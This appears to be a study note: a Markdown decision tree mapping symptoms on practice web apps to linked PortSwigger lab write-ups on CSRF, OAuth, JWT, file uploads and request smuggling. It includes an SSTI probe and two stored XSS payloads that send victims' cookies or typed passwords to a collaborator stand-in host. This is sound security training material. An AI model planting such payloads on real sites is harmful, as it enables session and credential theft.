### Authenticated Blog
#### No Comments
##### GraphQL
- "mutation"
	- [GraphQL Endpoints](GraphQL%20Endpoints.md#2.4.%20Lab%20Bypassing%20GraphQL%20brute%20force%20protections%20%E2%AD%95%EF%B8%8F)
	- [GraphQL Endpoints](GraphQL%20Endpoints.md#2.5.%20Lab%20Performing%20CSRF%20exploits%20over%20GraphQL%20%E2%AD%95%EF%B8%8F)


#### Only Comment Field in Blog
##### Change Preferred Name
- `}}{{7*7}}` on `blog-post-author-display` param in `POST` request
	- Tornado
		- [SSTI](SSTI.md#3.2.%20Lab%20Basic%20server-side%20template%20injection%20%28code%20context%29%20%E2%AD%95%EF%B8%8F)

##### Change Email + Upload Avatar + Delete account button
- [Deserialization](Deserialization.md#3.%20Lab%20Using%20application%20functionality%20to%20exploit%20insecure%20deserialization%20%E2%AD%95%EF%B8%8F)

#### Every field
##### My account
- "We are now redirecting you to login with social media..."
	- [CSRF](CSRF.md#2.10.%20Lab%20SameSite%20Lax%20bypass%20via%20cookie%20refresh%20%E2%AD%95%EF%B8%8F)
	- No features (no change email, etc.)
		- `POST /authenticate`
			- [OAuth Authentication](OAuth%20Authentication.md#1%2F2.1.%20Lab%20Authentication%20bypass%20via%20OAuth%20implicit%20flow%20%E2%AD%95%EF%B8%8F)
			- "Next post" button on blogs
				- [OAuth Authentication](OAuth%20Authentication.md#1%2F2.5.%20Lab%20Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect%20%E2%AD%95%EF%B8%8F)
		- *NO* `POST /authenticate`
			- [OAuth Authentication](OAuth%20Authentication.md#1%2F2.2.%20Lab%20SSRF%20via%20OpenID%20dynamic%20client%20registration%20%E2%AD%95%EF%B8%8F)
			- [OAuth Authentication](OAuth%20Authentication.md#1%2F2.4.%20Lab%20OAuth%20account%20hijacking%20via%20redirect_uri%20%E2%AD%95%EF%B8%8F)
- Login with social media button
	- Social media creds: `peter.wiener:hotdog`
		- [CSRF](CSRF.md#2.x.%20Lab%20Forced%20OAuth%20profile%20linking%20%E2%AD%95%EF%B8%8F)


##### Forgot password?
- `Host` to `example.com`
	- 200 OK
		- [Host Headers](Host%20Headers.md#1.1%20Lab%20Basic%20password%20reset%20poisoning%20%E2%AD%95%EF%B8%8F)
	- 421 Misdirected Request
		- [Host Headers](Host%20Headers.md#1.11%20Lab%20Password%20reset%20poisoning%20via%20middleware%20%E2%AD%95%EF%B8%8F)
- `username` in `POST /forgot-password`
	- [Password Reset](Password%20Reset.md#2.5.%20Lab%20Exploiting%20time-sensitive%20vulnerabilities%20%E2%AD%95%EF%B8%8F)
	- `temp-forgot-password-token`
		- [Password Reset](Password%20Reset.md#2.3.%20Lab%20Password%20reset%20broken%20logic%20%E2%AD%95%EF%B8%8F)

##### Asks for 4-digit security code
- [Authentication](Authentication.md#1.2.%20Lab%202FA%20simple%20bypass%20%E2%AD%95%EF%B8%8F)
- `verify` cookie 
	- [Authentication](Authentication.md#1.8.%20Lab%202FA%20broken%20logic%20%E2%AD%95%EF%B8%8F)

##### Login Attempt: `wiener:peter`
- "Invalid username or password."
	- [Authentication](Authentication.md#1.7.%20Lab%20Username%20enumeration%20via%20account%20lock%20%E2%AD%95%EF%B8%8F)
	- [Brute Force](Brute%20Force.md#1.4.%20Lab%20Username%20enumeration%20via%20subtly%20different%20responses%20%E2%AD%95%EF%B8%8F)
	- "HTML is allowed" in Blog + `x-host`
		- <sup>Param Miner: Guess headers</sup> [Web Cache Poisoning](Web%20Cache%20Poisoning.md#1.4.Lab%20Targeted%20web%20cache%20poisoning%20using%20an%20unknown%20header%20%E2%AD%95%EF%B8%8F)
	- **Post Comment**
		- `<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>` and victim's cookie in collaborator
			- [Stored XSS](Stored%20XSS.md#1.x.%20Lab%20Exploiting%20cross-site%20scripting%20to%20steal%20cookies%20%E2%AD%95%EF%B8%8F)
		- `<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">`
			- [Stored XSS](Stored%20XSS.md#1.x.%20Lab%20Exploiting%20cross-site%20scripting%20to%20capture%20passwords%20%E2%AD%95%EF%B8%8F)
	- **Use HTTP Request Smuggling payload**
		- 500 Internal Server Error
			- [CL](CL.md#1.3.%20Lab%20Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls%2C%20CL.TE%20vulnerability%20%E2%AD%95%EF%B8%8F)
			- [Others](Others.md#1.6.%20Lab%20Exploiting%20HTTP%20request%20smuggling%20to%20capture%20other%20users%27%20requests%20%E2%AD%95%EF%B8%8F)
- "Invalid username"
	- [Brute Force](Brute%20Force.md#1.1%20Lab%20Username%20enumeration%20via%20different%20responses%20%E2%AD%95%EF%B8%8F)
- Admin panel or `/admin` = "Path /admin is blocked"
	- **Use HTTP Request Smuggling payload**
		- 400 Bad Request
			- [Others](Others.md#1.x.%20Lab%20CL.0%20request%20smuggling%20%E2%AD%95%EF%B8%8F)
			- [TE](TE.md#1.4.%20Lab%20Exploiting%20HTTP%20request%20smuggling%20to%20bypass%20front-end%20security%20controls%2C%20TE.CL%20vulnerability%20%E2%AD%95%EF%B8%8F)

##### Stay Logged In Checkbox
- [Brute Force](Brute%20Force.md#1.9.%20Lab%20Brute-forcing%20a%20stay-logged-in%20cookie%20%E2%AD%95%EF%B8%8F)
- No client-side validation for Email field
	- [Business logic vulnerabilities](Business%20logic%20vulnerabilities.md#2.10.%20Lab%20Authentication%20bypass%20via%20encryption%20oracle%20%E2%AD%95%EF%B8%8F)
- Delete account button
	- [Brute Force](Brute%20Force.md#1.10.%20Lab%20Offline%20password%20cracking%20%E2%AD%95%EF%B8%8F)

##### Change Email
- Invalid Login Attempts: `aaa:aaa`
	- "You have made too many incorrect login attempts. Please try again in X minute(s)."
		- [Authentication](Authentication.md#1.6.%20Lab%20Broken%20brute-force%20protection%2C%20IP%20block%20%E2%AD%95%EF%B8%8F)
		- [Brute Force](Brute%20Force.md#1.5.%20Lab%20Username%20enumeration%20via%20response%20timing%20%E2%AD%95%EF%B8%8F)
		- [Race conditions](Race%20conditions.md#1%2F2.2.%20Lab%20Bypassing%20rate%20limits%20via%20race%20conditions%20%E2%AD%95%EF%B8%8F)
- `/my-account?id={GUID}`
	- [Access Control](Access%20Control.md#2.6.%20Lab%20User%20ID%20controlled%20by%20request%20parameter%2C%20with%20unpredictable%20user%20IDs%20%E2%AD%95%EF%B8%8F)
- `POST /my-account/change-email`
	- No `csrf` token
		- [CSRF](CSRF.md#2.1.%20Lab%20CSRF%20vulnerability%20with%20no%20defenses%20%E2%AD%95%EF%B8%8F)
		- [CSRF](CSRF.md#2.7.%20Lab%20SameSite%20Lax%20bypass%20via%20method%20override%20%E2%AD%95%EF%B8%8F)
		- `SameSite=None`
			- [CSRF](CSRF.md#2.11.%20Lab%20CSRF%20where%20Referer%20validation%20depends%20on%20header%20being%20present%20%E2%AD%95%EF%B8%8F)
			- [CSRF](CSRF.md#2.12.%20Lab%20CSRF%20with%20broken%20Referer%20validation%20%E2%AD%95%EF%B8%8F)
		- `SameSite=Strict`
			- [CSRF](CSRF.md#2.8.%20Lab%20SameSite%20Strict%20bypass%20via%20client-side%20redirect%20%E2%AD%95%EF%B8%8F)
	- Yes `csrf` token 
		- Content-Security-Policy
			- [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20protected%20by%20very%20strict%20CSP%2C%20with%20dangling%20markup%20attack%20%E2%AD%95%EF%B8%8F)
		- Remove `csrf` token
			- 302 Found
				- [CSRF](CSRF.md#2.2.%20Lab%20CSRF%20where%20token%20validation%20depends%20on%20request%20method%20%E2%AD%95%EF%B8%8F)
				- [CSRF](CSRF.md#2.3.%20Lab%20CSRF%20where%20token%20validation%20depends%20on%20token%20being%20present%20%E2%AD%95%EF%B8%8F)
			- 400 Bad Request: "Missing parameter 'csrf'"
				- [CSRF](CSRF.md#2.4.%20Lab%20CSRF%20where%20token%20is%20not%20tied%20to%20user%20session%20%E2%AD%95%EF%B8%8F)
				- [Stored XSS](Stored%20XSS.md#1.x.%20Lab%20Exploiting%20XSS%20to%20bypass%20CSRF%20defenses%20%E2%AD%95%EF%B8%8F)
				- [Clickjacking](Clickjacking.md#1%2F2.2.%20Lab%20Clickjacking%20with%20form%20input%20data%20prefilled%20from%20a%20URL%20parameter%20%E2%AD%95%EF%B8%8F)
				- [Clickjacking](Clickjacking.md#1%2F2.3.%20Lab%20Clickjacking%20with%20a%20frame%20buster%20script%20%E2%AD%95%EF%B8%8F)
- "Your API Key is: ..."
	- [Web cache deception](Web%20cache%20deception.md#1%2F2.1.%20Lab%20Exploiting%20path%20mapping%20for%20web%20cache%20deception%20%E2%AD%95%EF%B8%8F)
	- `Server: Apache-Coyote/1.1`
		- [Web cache deception](Web%20cache%20deception.md#1%2F2.2.%20Lab%20Exploiting%20path%20delimiters%20for%20web%20cache%20deception%20%E2%AD%95%EF%B8%8F)
	- Cache headers (`X-Cache`, `Age`, etc) only in `/resources`
		- Adding `.js` in `GET /my-account/aaa.js` doesn't reveal cache headers
			- [Web cache deception](Web%20cache%20deception.md#1%2F2.3.%20Lab%20Exploiting%20origin%20server%20normalization%20for%20web%20cache%20deception%20%E2%AD%95%EF%B8%8F)
			- [Web cache deception](Web%20cache%20deception.md#1%2F2.4.%20Lab%20Exploiting%20cache%20server%20normalization%20for%20web%20cache%20deception%20%E2%AD%95%EF%B8%8F)

##### Change Email + Delete Account
- `csrf` token
	- remove `csrf` token == 400 Bad Request
		- [Clickjacking](Clickjacking.md#1%2F2.1.%20Lab%20Basic%20clickjacking%20with%20CSRF%20token%20protection%20%E2%AD%95%EF%B8%8F)
		- [Clickjacking](Clickjacking.md#1%2F2.5.%20Lab%20Multistep%20clickjacking%20%E2%AD%95%EF%B8%8F)


##### Change Password + Change Email
- Remove `current-password`
	- 200 OK
		- [Password Reset](Password%20Reset.md#2.7.%20Lab%20Weak%20isolation%20on%20dual-use%20endpoint%20%E2%AD%95%EF%B8%8F)
	- 400 Bad Request: "Missing parameter"
		- [Password Reset](Password%20Reset.md#1.12.%20Lab%20Password%20brute-force%20via%20password%20change%20%E2%AD%95%EF%B8%8F)


#### Every field + File Upload in Blog
##### My account > File Upload
- After uploading `.php` file
	- `GET /.../{FILE}.php`
		- 200 OK
			- [File Uploads](File%20Uploads.md#3.1.%20Lab%20Remote%20code%20execution%20via%20web%20shell%20upload%20%E2%AD%95%EF%B8%8F)
			- [File Uploads](File%20Uploads.md#3.3.%20Lab%20Web%20shell%20upload%20via%20path%20traversal%20%E2%AD%95%EF%B8%8F)
		- "Sorry, file type text/php is not allowed Only image/jpeg and image/png are allowed..."
			- [File Uploads](File%20Uploads.md#3.2.%20Lab%20Web%20shell%20upload%20via%20Content-Type%20restriction%20bypass%20%E2%AD%95%EF%B8%8F)
	- `POST /my-account/avatar`
		- "Sorry, php files are not allowed"
			- [File Uploads](File%20Uploads.md#3.4.%20Lab%20Web%20shell%20upload%20via%20extension%20blacklist%20bypass%20%E2%AD%95%EF%B8%8F)
		- "Sorry, only JPY & PNG files are allowed"
			- [File Uploads](File%20Uploads.md#3.5.%20Lab%20Web%20shell%20upload%20via%20obfuscated%20file%20extension%20%E2%AD%95%EF%B8%8F)
		- "Error: file is not a valid image"
			- [File Uploads](File%20Uploads.md#3.6.%20Lab%20Remote%20code%20execution%20via%20polyglot%20web%20shell%20upload%20%E2%AD%95%EF%B8%8F)

#### Search Bar
##### `/admin`
- "Admin interface only available if logged in as an administrator"
	- JWT
		- <sup>Scan result: YES</sup>[JWT](JWT.md#2.1.%20Lab%20JWT%20authentication%20bypass%20via%20unverified%20signature%20%E2%AD%95%EF%B8%8F)
		- <sup>Scan result: YES</sup> [JWT](JWT.md#2.2.%20Lab%20JWT%20authentication%20bypass%20via%20flawed%20signature%20verification%20%E2%AD%95%EF%B8%8F)
		- <sup>JWT is smaller</sup> [JWT](JWT.md#2.3.%20Lab%20JWT%20authentication%20bypass%20via%20weak%20signing%20key%20%E2%AD%95%EF%B8%8F)
		- <sup>Scan result: YES</sup> [JWT](JWT.md#2.4.%20Lab%20JWT%20authentication%20bypass%20via%20jwk%20header%20injection%20%E2%AD%95%EF%B8%8F)
		- <sup>Scan result: YES</sup> [JWT](JWT.md#2.5.%20Lab%20JWT%20authentication%20bypass%20via%20jku%20header%20injection%20%E2%AD%95%EF%B8%8F)
		- [JWT](JWT.md#2.6.%20Lab%20JWT%20authentication%20bypass%20via%20kid%20header%20path%20traversal%20%E2%AD%95%EF%B8%8F)

##### Change Email
- `POST /my-account/change-email`
	- No `csrf` token
		- -
	- Yes `csrf` token 
		- Remove `csrf` token
			- 400 Bad Request: 
				- "Invalid CSRF token"
					- [CSRF](CSRF.md#2.5.%20Lab%20CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie%20%E2%AD%95%EF%B8%8F)
				- "Missing parameter 'csrf'"
					- [Essential skills](Essential%20skills.md#1%2F2.2.%20Lab%20Scanning%20non-standard%20data%20structures%20%E2%AD%95%EF%B8%8F)
		- `csrf` cookie
			- [CSRF](CSRF.md#2.6.%20Lab%20CSRF%20where%20token%20is%20duplicated%20in%20cookie%20%E2%AD%95%EF%B8%8F)

##### Submit Feedback
- `searchLoggerConfigurable.js`
	- `config.transport_url`
		- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [Client side](Client%20side.md#2.1.%20Lab%20Client-side%20prototype%20pollution%20via%20browser%20APIs%20%E2%AD%95%EF%B8%8F)
- `searchLogger.js`
	- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [Client side](Client%20side.md#2.2.%20Lab%20DOM%20XSS%20via%20client-side%20prototype%20pollution%20%E2%AD%95%EF%B8%8F)
- `searchLoggerFiltered.js`
	- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [Client side](Client%20side.md#2.4.%20Lab%20Client-side%20prototype%20pollution%20via%20flawed%20sanitization%20%E2%AD%95%EF%B8%8F)
- `jquery_3-0-0.js`
	- <sup>DOM Invader > Scan for gadgets: eval(1)</sup> [Client side](Client%20side.md#2.3.%20Lab%20DOM%20XSS%20via%20an%20alternative%20prototype%20pollution%20vector%20%E2%AD%95%EF%B8%8F)


##### Use the HTTP Request Smuggling Payload
- 400 Bad Request -- "Both chunked encoding and content-length were specified"
	- Cannot login
		- [HTTP2](HTTP2.md#1.8.%20Lab%20Response%20queue%20poisoning%20via%20H2.TE%20request%20smuggling%20%E2%AD%95%EF%B8%8F)
		- [HTTP2](HTTP2.md#1.11.%20Lab%20HTTP%2F2%20request%20splitting%20via%20CRLF%20injection%20%E2%AD%95%EF%B8%8F)
	- Can login
		- [HTTP2](HTTP2.md#1.10.%20Lab%20HTTP%2F2%20request%20smuggling%20via%20CRLF%20injection%20%E2%AD%95%EF%B8%8F)
		
- 500 Internal Server Error -- "Server Error: Communication timed out"
	- Can login
		- [Others](Others.md#1.5.%20Lab%20Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting%20%E2%AD%95%EF%B8%8F)


---